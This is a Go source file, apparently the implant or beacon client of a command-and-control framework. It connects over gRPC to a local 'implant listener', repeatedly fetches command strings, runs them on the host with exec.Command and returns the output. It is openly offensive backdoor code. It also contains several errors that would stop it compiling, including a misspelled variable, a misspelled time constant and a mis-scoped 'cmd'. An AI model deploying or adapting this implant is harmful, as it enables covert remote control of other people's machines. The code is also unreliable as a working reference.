package main

import(
  "fmt"
  "log"
  "time"
  "os/exec"
  "strings"
  "golang.org/x/net/context"
  "google.golang.org/grpc"
  "github.com/alphamystic/wheagle/beacon/protos/stream"
)

func main(){
  var (
    err error
    opts []grpc.DialOption
    conn *grpc.ClientConn
    client stream.ImplantClient
  )

  opts = append(opts,grpc.WithInsecure())
  if conn,err = grpc.Dial(fmt.Sprintf("localhost:%d",5002),opts...); err != nil{
    log.Fatalf("[-]   Error dialing implant listener: %v",err)
  }
  defer conn.Close()
  cliet = stream.NewImplantClient(conn)
  ctx := context.Background()
  for{
    var req = new(stream.Empty)
    if cmd,err := client.FetchCommand(ctx,req); err != nil{
      log.Fatalf("[-] Error fetching coomand: %v",err)
    }
    if cmd.In == "" {
      time.Sleep(3 * time.Seccond)
      continue
    }
    tokens := strings.Split(cmd.In," ")
    var c *exec.Cmd
    if len(tokens) == 1 {
      c = exec.Command(tokens[0])
    } else {
      c = exec.Command(tokens[0],tokens[1:]...)
    }
    buf,err := c.CombinedOutput()
    if err != nil{
      cmd.out = err.Error()
    }
    cmd.Out += string(buf)
    client.SendOutput(ctx,cmd)
  }
}
